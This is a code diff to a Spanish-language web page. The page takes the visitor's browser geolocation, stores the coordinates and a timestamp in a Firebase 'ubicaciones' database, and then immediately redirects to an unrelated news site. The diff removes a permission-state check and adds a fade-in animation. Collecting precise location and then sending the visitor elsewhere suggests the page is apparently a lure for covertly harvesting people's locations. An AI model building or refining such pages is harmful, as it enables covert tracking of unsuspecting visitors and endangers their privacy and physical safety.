@@ -28,35 +28,28 @@
         return;
       }
 
-      navigator.permissions.query({ name: 'geolocation' }).then(function(result) {
-        if (result.state === 'denied') {
-          alert("Debes habilitar los permisos de ubicación en tu navegador.");
-          return;
-        }
-
-        navigator.geolocation.getCurrentPosition(
-          (position) => {
-            const datos = {
-              latitud: position.coords.latitude,
-              longitud: position.coords.longitude,
-              timestamp: new Date().toISOString()
-            };
-            const refUbicaciones = push(ref(db, 'ubicaciones'));
-            set(refUbicaciones, datos).then(() => {
-              window.location.href = "https://www.eltiempo.com";
-            }).catch(err => {
-              alert("Error al guardar ubicación en Firebase: " + err.message);
-            });
-          },
-          (error) => {
-            if (error.code === error.PERMISSION_DENIED) {
-              alert("Debes permitir el acceso a tu ubicación para continuar.");
-            } else {
-              alert("Error al obtener la ubicación: " + error.message);
-            }
+      navigator.geolocation.getCurrentPosition(
+        (position) => {
+          const datos = {
+            latitud: position.coords.latitude,
+            longitud: position.coords.longitude,
+            timestamp: new Date().toISOString()
+          };
+          const refUbicaciones = push(ref(db, 'ubicaciones'));
+          set(refUbicaciones, datos).then(() => {
+            window.location.href = "https://www.eltiempo.com";
+          }).catch(err => {
+            alert("Error al guardar ubicación en Firebase: " + err.message);
+          });
+        },
+        (error) => {
+          if (error.code === error.PERMISSION_DENIED) {
+            alert("Debes permitir el acceso a tu ubicación en el navegador.");
+          } else {
+            alert("Error al obtener la ubicación: " + error.message);
           }
-        );
-      });
+        }
+      );
     }
 
     window.onload = () => {
@@ -85,9 +78,16 @@
       width: 100%;
       text-align: center;
       box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+      animation: fadeIn 0.8s ease;
     }
-    h2 { margin-bottom: 10px; font-size: 24px; }
-    p { margin-bottom: 30px; font-size: 16px; }
+    h2 {
+      margin-bottom: 10px;
+      font-size: 24px;
+    }
+    p {
+      margin-bottom: 30px;
+      font-size: 16px;
+    }
     button {
       background-color: #2a5298;
       color: white;
@@ -100,6 +100,10 @@
     }
     button:hover {
       background-color: #1e3c72;
+    }
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(20px); }
+      to { opacity: 1; transform: translateY(0); }
     }
     @media (max-width: 480px) {
       .contenedor { padding: 30px 20px; }
